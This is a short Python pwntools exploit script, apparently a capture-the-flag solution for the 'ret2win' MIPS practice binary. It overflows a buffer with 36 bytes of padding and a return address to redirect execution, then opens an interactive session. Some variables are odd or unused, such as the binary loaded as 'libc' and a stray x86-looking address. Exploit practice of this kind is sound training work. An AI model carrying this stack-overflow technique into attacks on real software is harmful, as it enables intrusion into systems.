from pwn import *

exe = ELF('./ret2win_mipsel')
context.binary = exe
context.log_level = 'info'

libc = ELF('./ret2win_mipsel')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', './ret2win_mipsel'])

offset = 36 #pattern search $ra

ret2win = 0x00400a00

ret = 0x0804837e

log.info(p32(ret2win))

payload = b'A' * offset + p32(ret2win)

io.sendline(payload)

io.interactive()

